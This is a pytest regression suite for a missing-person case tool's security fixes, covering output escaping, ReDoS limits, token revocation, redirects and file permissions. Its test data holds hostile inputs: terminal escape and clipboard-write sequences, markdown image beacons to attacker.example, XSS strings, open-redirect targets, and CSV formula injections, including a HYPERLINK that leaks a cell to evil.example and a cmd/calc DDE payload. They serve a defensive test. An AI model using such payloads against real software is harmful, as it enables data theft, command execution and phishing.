"""Regression tests for the security sweep: each test pins one finding so it can't quietly come back."""
from __future__ import annotations

import csv
import io
import json
import os
import re
import stat
import sys
import time
from pathlib import Path

import pytest
from click.testing import CliRunner

from ark_angel.analysis.extract import extract_entities
from ark_angel.cases.store import FileCaseStore
from ark_angel.cli import cli
from ark_angel.geo.exif import gps_from_exif
from ark_angel.ingest.browse_source import Capture, capture_to_evidence, scrub_url
from ark_angel.ingest.username_source import valid_username
from ark_angel.models import Case, Evidence
from ark_angel.report.gis import render_canvass_csv, render_geojson
from ark_angel.textsafe import csv_cell, md, md_url, no_markup, printable, terminal_safe

ESCAPES = "\x1b]0;pwned\x07\x1b]52;c;ZWNobyBoaQ==\x07\x1b[2J‮evil"  # retitle, clipboard write, clear, bidi


# Malformed EXIF from strangers' photos


def test_broken_gps_rationals_are_ignored_not_fatal() -> None:
    import piexif

    gps = piexif.GPSIFD
    for latitude in (((40, 0), (0, 1), (0, 1)), ((40, 1),), "nonsense", ((900, 1), (0, 1), (0, 1))):
        exif = {"GPS": {gps.GPSLatitudeRef: b"N", gps.GPSLatitude: latitude,
                        gps.GPSLongitudeRef: b"W", gps.GPSLongitude: ((105, 1), (0, 1), (0, 1))}}
        assert gps_from_exif(exif) is None


def _malformed_gps_jpeg() -> bytes:
    import piexif
    from PIL import Image

    exif = piexif.dump({"GPS": {piexif.GPSIFD.GPSLatitudeRef: b"N", piexif.GPSIFD.GPSLatitude: ((40, 0), (0, 1), (0, 1)),
                                piexif.GPSIFD.GPSLongitudeRef: b"W",
                                piexif.GPSIFD.GPSLongitude: ((105, 1), (0, 1), (0, 1))},
                        "0th": {piexif.ImageIFD.Make: b"Acme\x1b[2J" + b"A" * 5000}})
    buffer = io.BytesIO()
    Image.new("RGB", (16, 16)).save(buffer, "JPEG", exif=exif)
    return buffer.getvalue()


def _published_case(site) -> tuple[str, str]:
    from web_helpers import new_case

    owner = site.member("owner")
    case_id = new_case(owner)
    site.db.save_draft(case_id, {"name": "Riley", "police_report": "PD 1", "attest": True})
    site.db.request_publication(case_id)
    return case_id, site.db.approve_publication(case_id, site.db.case(case_id)["draft_version"])


def test_a_malformed_photo_never_costs_a_tip(tmp_path) -> None:
    pytest.importorskip("flask")
    from web_helpers import Site, post

    site = Site(tmp_path)
    case_id, slug = _published_case(site)
    resp = post(site.client(), f"/missing/{slug}/tip", {"what": "I saw her near the station tonight"},
                form_page=f"/missing/{slug}", files={"photo": (_malformed_gps_jpeg(), "x.jpg")})
    assert resp.status_code == 302
    case = site.store.get_case(case_id)
    tips = [e for e in case.evidence if (e.metadata or {}).get("source") == "web_tips"]
    assert len(tips) == 2  # the tip and its photo
    device = tips[1].metadata["device"]
    assert "\x1b" not in device and len(device) <= 100


def test_a_failed_tip_leaves_no_orphan_photo(tmp_path, monkeypatch) -> None:
    pytest.importorskip("flask")
    from web_helpers import Site, photo, post

    import ark_angel.web.public as public

    site = Site(tmp_path)
    site.app.config.update(TESTING=False, PROPAGATE_EXCEPTIONS=False)
    case_id, slug = _published_case(site)

    def broken(*args, **kwargs):
        raise RuntimeError("disk full")

    monkeypatch.setattr(public, "_add_tip", broken)
    resp = post(site.client(), f"/missing/{slug}/tip", {"what": "I saw her near the station tonight"},
                form_page=f"/missing/{slug}", files={"photo": (photo(tmp_path / "p.jpg"), "p.jpg")})
    assert resp.status_code == 500
    assert list((tmp_path / "uploads" / case_id).glob("photo-*")) == []


# Regular-expression denial of service


@pytest.mark.parametrize("text", ["a" * 300_000, "a." * 150_000, "1" * 300_000 + "x", "1 " * 150_000 + "x"])
def test_extraction_is_linear_on_hostile_pages(text: str) -> None:
    started = time.perf_counter()
    extract_entities(text)
    assert time.perf_counter() - started < 3  # was minutes before the patterns were bounded


def test_extraction_still_finds_real_contacts() -> None:
    found = {(e.kind, e.value) for e in extract_entities(
        "mailto:jane@example.com, x.y+z@sub.example.co.uk; call +1 (303) 555-0147")}
    assert found == {("email", "jane@example.com"), ("email", "x.y+z@sub.example.co.uk"), ("phone", "3035550147")}


# Output escaping


def test_terminal_escapes_are_neutralized_but_our_colours_stay() -> None:
    assert "\x1b" not in printable(ESCAPES) and "‮" not in printable(ESCAPES)
    assert printable("line one\n\tline two") == "line one\n\tline two"
    styled = "\x1b[1mbold\x1b[0m " + ESCAPES
    assert terminal_safe(styled).startswith("\x1b[1mbold\x1b[0m ") and "\x1b]" not in terminal_safe(styled)


def test_cli_never_prints_escapes_from_evidence(tmp_path: Path) -> None:
    store = FileCaseStore(tmp_path / "cases")
    store.create_case(Case("C1", "case"))
    store.add_evidence("C1", [Evidence("a", "text", f"call 303-555-0147 {ESCAPES}", {"source": "tips"}),
                              Evidence("b", "text", f"(303) 555-0147 {ESCAPES}", {"source": "notes"})])
    runner = CliRunner()
    base = ["--data-dir", str(tmp_path / "cases")]
    runner.invoke(cli, [*base, "enrich", "C1"])
    for args in (["report", "C1"], ["lead", "list", "C1"], ["lead", "show", "C1", "1"]):
        output = runner.invoke(cli, [*base, *args], color=True).output
        assert "\x1b]" not in output and "\x1b[2J" not in output and "‮" not in output, args


def test_markdown_reports_cant_carry_links_images_or_html(tmp_path: Path) -> None:
    store = FileCaseStore(tmp_path / "cases")
    store.create_case(Case("C1", "case"))
    beacon = "![x](https://attacker.example/px.png) <img src=https://attacker.example/2> [go](javascript:alert(1))"
    store.add_evidence("C1", [Evidence("a", "text", f"call 303-555-0147 {beacon}", {"source": "tips"}),
                              Evidence("b", "text", "(303) 555-0147", {"source": "notes"})])
    runner = CliRunner()
    base = ["--data-dir", str(tmp_path / "cases")]
    runner.invoke(cli, [*base, "enrich", "C1"])
    output = runner.invoke(cli, [*base, "report", "C1", "--format", "md"]).output
    # Escaped (\\[ \\( \\<) is fine: it shows as text. Unescaped would be a live link, image or tag.
    for live in (r"(?<!\\)\]\(https://attacker", r"(?<!\\)<img", r"(?<!\\)\]\(javascript", r"(?<!\\)!\["):
        assert not re.search(live, output), live
    assert md("![a](b)") == "\\!\\[a\\]\\(b\\)"
    assert md_url("https://a.example/x) ![p](https://evil") == "https://a.example/x%29%20!%5Bp%5D%28https://evil"
    assert md_url("javascript:alert(1)") == ""


def test_spreadsheet_cells_cant_run_formulas() -> None:
    assert csv_cell('=HYPERLINK("https://evil.example?"&A1,"Click")').startswith("'=")
    for formula in ("+1+1", "-1+cmd|' /C calc'!A0", "@SUM(A1)", "\tx", "＝1+1"):
        assert csv_cell(formula).startswith("'")
    assert csv_cell("-104.95") == "-104.95" and csv_cell(-104.95) == -104.95 and csv_cell("Acme Ltd") == "Acme Ltd"
    canvass = [{"label": "#1 location cluster", "lead_rank": 1, "latest": "", "latitude": 1.0, "longitude": 2.0,
                "radius_m": 300, "lead_id": "geo-1", "cameras": [
                    {"kind": "camera", "operator": '=HYPERLINK("https://evil.example","x")', "zone": "@town",
                     "distance_m": 10, "facing": None, "latitude": 1.0, "longitude": -2.5, "osm": "node/1",
                     "osm_url": "https://www.openstreetmap.org/node/1", "direction": None}]}]
    row = list(csv.reader(io.StringIO(render_canvass_csv(canvass))))[1]
    assert row[4].startswith("'=") and row[5] == "'@town" and row[9] == "-2.5"


def test_map_pins_show_markup_as_text() -> None:
    assert no_markup("<script>alert(1)</script>") == "‹script›alert(1)‹/script›"
    report = {"case": {"title": "T", "identifier": "C1"}, "leads": [], "places": [], "clusters": [{
        "lead_id": "x", "latitude": 1.0, "longitude": 2.0, "radius_m": 5, "places": [],
        "points": [{"evidence_id": "a", "source": "<b>tips</b>", "latitude": 1.0, "longitude": 2.0, "place": None}]}],
        "evidence": [{"identifier": "a", "exhibit": "EX-001", "timestamp": "", "content": "<img src=x onerror=alert(1)>"}]}
    text = render_geojson(report)
    assert "<img" not in text and "<b>" not in text and json.loads(text)


# Accounts and recorder tokens


def test_password_change_and_disabling_revoke_recorder_tokens(tmp_path) -> None:
    pytest.importorskip("flask")
    from web_helpers import PASSWORD, Site, new_case

    site = Site(tmp_path)
    owner = site.member("owner")
    case_id = new_case(owner)
    user_id = site.db.user("owner")["id"]
    site.db.create_recorder_token(user_id, case_id)
    site.db.set_password("owner", PASSWORD + "!")
    assert site.db.recorder_tokens(case_id) == []
    site.db.create_recorder_token(user_id, case_id)
    site.db.set_status("owner", "disabled")
    assert site.db.recorder_tokens(case_id) == []


def test_turning_on_2fa_revokes_recorder_tokens(tmp_path) -> None:
    pytest.importorskip("flask")
    from web_helpers import PASSWORD, Site, new_case, post

    from ark_angel.web import totp

    site = Site(tmp_path)
    owner = site.member("owner")
    case_id = new_case(owner)
    site.db.create_recorder_token(site.db.user("owner")["id"], case_id)
    post(owner, "/app/account/2fa/start", {"password": PASSWORD})
    secret = site.db.pending_totp(site.db.user("owner")["id"])
    resp = post(owner, "/app/account/2fa/confirm", {"code": totp.code_at(secret, totp.step_at(site.clock()))})
    assert "1 recorder token revoked" in resp.get_data(as_text=True)
    assert site.db.recorder_tokens(case_id) == []


def test_sign_in_redirects_reject_whitespace_and_controls() -> None:
    pytest.importorskip("flask")
    from ark_angel.web.app import safe_next

    for target in ("/\t/evil.com", "/ /evil.com", "/\x00/evil.com", "/　/evil.com", "/" + "a" * 3000):
        assert safe_next(target) == "/app/"
    assert safe_next("/app/cases/c1?notice=x") == "/app/cases/c1?notice=x"


# Network lookups and captured URLs


def test_usernames_are_validated_before_they_reach_a_url() -> None:
    assert valid_username("@Riley_T.99") == "Riley_T.99"
    for bad in ("../admin", "a/b", "x?y=1", "a b", "a..b", "", "@", "x" * 41, "%2e%2e"):
        with pytest.raises(ValueError):
            valid_username(bad)


def test_captured_urls_lose_their_secrets() -> None:
    assert scrub_url("https://acc.example/reset?token=abc&user=riley") == "https://acc.example/reset?token=REDACTED&user=riley"
    assert scrub_url("https://a.example/cb?code=X&state=Y") == "https://a.example/cb?code=REDACTED&state=REDACTED"
    assert scrub_url("https://alice:hunter2@intranet.example/p") == "https://intranet.example/p"
    assert scrub_url("https://a.example/#access_token=eyJ&x=1") == "https://a.example/"
    assert scrub_url("https://a.example/page#section-2") == "https://a.example/page#section-2"
    evidence = capture_to_evidence(Capture(url="https://bank.example/login?session_id=s3cr3t&q=riley",
                                           when=__import__("datetime").datetime(2026, 11, 2, 14, 0)))
    assert "s3cr3t" not in json.dumps(evidence.metadata) and "s3cr3t" not in evidence.content


# Files on disk


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX permissions")
def test_case_files_and_uploads_are_owner_only(tmp_path: Path) -> None:
    store = FileCaseStore(tmp_path / "cases")
    store.create_case(Case("C1", "case"))
    assert stat.S_IMODE(os.stat(tmp_path / "cases").st_mode) == 0o700
    assert stat.S_IMODE(os.stat(tmp_path / "cases" / "C1.json").st_mode) == 0o600
    pytest.importorskip("flask")
    from web_helpers import Site, photo

    from ark_angel.web.site import save_evidence_photo, save_upload

    site = Site(tmp_path / "site").app.extensions["ark_site"]
    for path in (save_evidence_photo(site, "c1", photo(tmp_path / "p.jpg")), save_upload(site, "c1", "a.txt", b"x")):
        assert stat.S_IMODE(os.stat(path).st_mode) == 0o600
        assert stat.S_IMODE(os.stat(path.parent).st_mode) == 0o700
    assert re.match(r"^photo-[0-9a-f]{16}\.jpg$", path.name) is None  # uploads keep their own names
